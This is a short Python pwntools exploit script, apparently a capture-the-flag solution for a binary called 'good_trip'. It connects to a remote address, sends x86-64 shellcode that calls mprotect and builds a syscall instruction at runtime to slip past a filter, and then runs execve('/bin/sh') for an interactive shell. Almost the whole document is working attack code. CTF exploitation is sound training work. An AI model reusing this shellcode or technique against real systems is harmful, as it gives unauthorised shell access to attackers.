#!/usr/bin/env python3

from pwn import *

exe = ELF("./good_trip")

context.binary = exe


def conn():
    r = process([exe.path])
    return r


def main():
    if 1:
        #r = process("./good_trip")
        r = remote("172.210.129.230", 1351)
        #r = remote("127.0.0.1", 1352)
        r.sendlineafter("code size >> ", str(0x900))
        r.recvuntil(">> ")

        shellcode = f"""
        mov r13, 0x1337131060
        mov r12, 0x050e
        mov rsp, qword ptr fs:[0]
        add rsp, 0x1000
        mov esi, 0x1000
        mov edx, 0x7
        mov r15, {exe.plt.mprotect}
        call r15
        inc r12
        mov eax, 0x3b
        mov rdi, 0x133713106f
        mov dword ptr [r13], r12d
        xor esi, esi
        xor edx, edx
        """

        
        #xor edx, edx
        #xor esi, esi
        
        pause()
        r.sendline(asm(shellcode) + p8(0x90)*0x20 + b"/bin/sh\x00")
        r.interactive()
    #except:
    #    r.close()



if __name__ == "__main__":
    if True:
        main()
